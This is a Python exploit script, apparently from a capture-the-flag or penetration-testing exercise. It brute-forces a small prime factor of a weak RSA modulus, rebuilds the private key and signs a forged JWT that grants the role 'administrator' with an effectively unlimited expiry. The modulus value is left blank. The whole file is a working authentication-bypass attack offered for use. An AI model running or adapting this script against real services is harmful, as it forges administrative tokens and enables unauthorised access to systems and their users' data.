#!/usr/bin/python3
import jwt, sympy
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# Known values
n = 
e = 65537

print(f"[*] Starting RSA key calculation...")
print(f"[*] Known RSA modulus (n): {n}")
print(f"[*] Known RSA public exponent (e): {e}")

# Brute force to find q (since q is small, we try primes in the range 2^19 to 2^20)
print("[*] Brute-forcing small prime factor q...")
for q in sympy.primerange(2**19, 2**20):
    if n % q == 0:
        print(f"[+] Found prime q: {q}")
        p = n // q
        print(f"[+] Calculated prime p: {p}")
        break

# Calculate phi(n) = (p-1)*(q-1) to compute the private exponent d
phi_n = (p - 1) * (q - 1)
print(f"[*] Calculated phi(n): {phi_n}")

# Compute the private exponent d = e^-1 mod phi(n)
d = pow(e, -1, phi_n)
print(f"[+] Calculated private exponent d: {d}")

# Reconstruct the RSA key using cryptography
print("[*] Reconstructing RSA key...")
private_key = rsa.RSAPrivateNumbers(
    p=p,
    q=q,
    d=d,
    dmp1=(d % (p - 1)),
    dmq1=(d % (q - 1)),
    iqmp=pow(q, -1, p),
    public_numbers=rsa.RSAPublicNumbers(e, n)
).private_key(default_backend())

print("[+] RSA key reconstructed successfully.")

# JWT Header and Payload
header = {
    "alg": "RS256",
    "typ": "JWT"
}

payload = {
    "email": "abc@example.de",
    "role": "administrator",
    "iat": 1728163313,
    "exp": 99999999999999,
    "jwk": {
        "kty": "RSA",
        "n": str(n),
        "e": e
    }
}

print("[*] Preparing to sign the JWT...")

# Export private key in PEM format for signing the JWT
private_key_pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)

# Sign the JWT using the private key
token = jwt.encode(payload, private_key_pem, algorithm="RS256", headers=header)

print(f"[+] Signed JWT: {token}")
